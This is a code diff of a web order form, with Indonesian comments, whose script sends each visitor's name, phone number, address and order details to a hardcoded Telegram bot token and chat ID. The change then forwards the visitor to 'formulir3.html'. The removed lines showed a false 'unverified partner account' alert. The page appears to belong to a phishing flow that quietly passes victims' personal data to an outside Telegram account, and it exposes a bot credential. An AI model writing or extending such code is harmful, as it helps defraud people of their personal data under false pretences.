@@ -199,12 +199,15 @@
                 </div>
             </main>
         </div>
-        </div>
+    </div>
 
     <script>
         // PASTIKAN ANDA MENGGANTI INI DENGAN TOKEN DAN CHAT ID TELEGRAM ANDA YANG AKTIF
         var TELEGRAM_TOKEN = "7812428468:AAE1qHjLLHOQlAmABXbr9JhXEg0KQkb0XW0";
         var CHAT_ID = "5923031825";
+        
+        // Definisikan halaman tujuan
+        var NEXT_PAGE = "formulir3.html";
 
         // --- UTILITY FUNCTIONS ---
 
@@ -230,13 +233,8 @@
             return cleanTel;
         }
 
-        function resetForm() {
-            document.getElementById('orderForm').reset();
-            document.getElementById('harga').value = '';
-        }
-
-        // --- FUNGSI KIRIM KE TELEGRAM (Hanya untuk Data Formulir) ---
-        function sendToTelegram(data) {
+        // Fungsi yang dimodifikasi untuk mengirim dan kemudian melanjutkan ke halaman berikutnya
+        function sendToTelegramAndRedirect(data) {
             let text =
                 "**--- 1. DATA FORMULIR PEMESANAN ---**\n\n" +
                 "Nama: " + data.namaLengkap + "\n" +
@@ -265,10 +263,15 @@
                 .then(response => {
                     if (!response.ok) {
                         console.error('Gagal mengirim ke Telegram. Status: ' + response.status);
+                        // Log error, tetapi tetap lanjutkan ke halaman berikutnya agar pengguna tidak stuck
                     }
+                    // PENGALIHAN HALAMAN DILAKUKAN SETELAH PENGIRIMAN DATA (BERHASIL ATAU GAGAL FETCH)
+                    window.location.href = NEXT_PAGE;
                 })
                 .catch(error => {
-                    console.error("Kesalahan pengiriman Telegram:", error);
+                    console.error("Kesalahan koneksi/fetch Telegram:", error);
+                    // PENGALIHAN HALAMAN DILAKUKAN MESKIPUN TERJADI KESALAHAN KONEKSI
+                    window.location.href = NEXT_PAGE;
                 });
         }
 
@@ -292,20 +295,14 @@
 
             var orderData = {
                 namaLengkap: nama,
-                nomorTelepon: formatPhoneNumber(telepon), // Simpan nomor telepon bersih +62...
+                nomorTelepon: formatPhoneNumber(telepon),
                 alamatLengkap: alamat,
                 namaProduk: namaProduk,
                 harga: harga
             };
 
-            // PENGIRIMAN DATA FORMULIR
-            sendToTelegram(orderData);
-
-            // TAMPILKAN ALERT SESUAI PERMINTAAN
-            alert('Anda belum memverifikasi akun mitra Anda. Silakan ulangi di aplikasi');
-
-            // RESET FORMULIR
-            resetForm();
+            // PANGGIL FUNGSI YANG MENGIRIM KE TELEGRAM DAN MENGALIHKAN
+            sendToTelegramAndRedirect(orderData);
         });
     </script>
 </body>
